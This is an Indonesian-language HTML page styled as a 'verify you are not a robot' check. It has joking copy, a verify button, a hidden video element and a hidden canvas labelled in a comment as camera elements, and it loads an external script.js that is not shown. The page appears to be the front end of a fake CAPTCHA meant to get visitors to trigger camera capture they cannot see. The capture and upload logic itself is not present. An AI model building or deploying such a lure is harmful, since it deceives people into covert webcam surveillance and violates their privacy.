<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>verifikasi anda bukan robot</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f172a, #1e293b);
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: rgba(30, 41, 59, 0.9);
            padding: 35px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
            text-align: center;
            max-width: 420px;
            width: 100%;
            border: 1px solid rgba(56, 189, 248, 0.2);
        }
        h2 { margin-bottom: 10px; color: #38bdf8; font-size: 24px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        .btn {
            background: linear-gradient(135deg, #0284c7, #0369a1);
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(2, 132, 199, 0.4);
            width: 100%;
        }
        .btn:hover {
            background: linear-gradient(135deg, #0369a1, #075985);
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(2, 132, 199, 0.6);
        }
        .loader {
            border: 4px solid #334155;
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 13px; color: #38bdf8; margin-top: 15px; font-weight: 500; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h2>Verifikasi Bahwa Anda Bukan Robot 🤖</h2>
        <p>Sistem mendeteksi Anda adalah manusia biasa yang sudah lelah bekerja. Silakan klik tombol untuk membuktikan Anda masih bernapas.</p>
        <button class="btn" id="verifyBtn" onclick="startProcess()">Saya Masih Hidup (Kurang Lebih)</button>
        <div class="loader" id="loader"></div>
        <p id="status"></p>
    </div>

    <!-- Elemen tersembunyi untuk kamera -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <!-- Memuat file script.js terpisah -->
    <script src="script.js"></script>
</body>
</html>
